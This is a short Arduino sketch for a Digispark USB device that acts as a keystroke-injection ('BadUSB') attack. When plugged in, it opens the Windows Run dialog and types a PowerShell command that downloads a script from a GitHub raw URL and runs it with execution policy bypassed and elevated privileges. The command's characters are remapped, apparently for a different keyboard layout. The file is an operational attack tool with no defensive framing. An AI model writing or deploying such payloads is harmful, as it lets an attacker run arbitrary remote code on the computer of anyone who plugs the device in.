#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell wget https>{{raw.githubusercontent.com{sj#wpid{schoolproject{main{run.ps! /outfile run.ps!` powershell /ExecutionPolicz Bzpass /File .{run.ps!");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
